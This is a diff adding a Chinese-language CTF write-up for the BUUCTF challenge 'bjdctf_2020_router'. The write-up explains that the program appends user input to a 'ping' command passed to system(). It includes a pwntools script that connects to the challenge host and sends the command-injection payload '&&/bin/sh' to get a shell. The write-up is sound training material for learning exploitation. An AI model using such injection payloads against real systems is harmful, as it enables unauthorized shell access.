@@ -404,7 +404,37 @@ if __name__ == "__main__":
     main()
 ```
 
-### 
+### bjdctf_2020_router
+
+[题目链接](https://buuoj.cn/challenges#bjdctf_2020_router)
+
+一看主函数这么长，细看闹麻了🤣🤣🤣
+
+<img width="1992" height="698" alt="image" src="https://github.com/user-attachments/assets/7e194572-9143-4628-80df-6c8ed6c5d71d" />
+
+只有 case1 有意义，把输入内容拼接到 dest 后面然后执行 system，但是 dest 是 ping（ASCII 码），没啥影响，后面写上 &&\bin\sh 就行。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+host = "node5.buuoj.cn"
+port = 28878
+io = remote(host,port)
+# io = process("./bjdctf_2020_router")
+
+def main():
+    io.recvuntil(b"Please input u choose:\n")
+    io.sendline(b"1")
+    io.recvuntil(b"Please input the ip address:\n")
+    io.sendline(b"&&/bin/sh")
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
 
 ## 中水区
 
